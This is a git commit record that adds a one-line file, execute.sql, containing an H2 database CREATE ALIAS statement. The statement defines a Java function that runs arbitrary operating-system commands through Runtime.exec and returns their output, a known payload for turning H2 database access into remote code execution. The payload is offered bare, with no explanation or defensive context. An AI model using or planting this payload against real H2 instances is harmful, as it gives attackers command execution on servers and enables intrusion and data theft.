1317998822ae2e8cf3cf93099ba648c47e62a5a5
Aravazhi MDR <aravazhimdr@gmail.com>
2020-06-22 17:00:52 +0530

    Create execute.sql

---
+++ execute.sql
@@ -0,0 +1,1 @@
+CREATE ALIAS OVOCMDEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
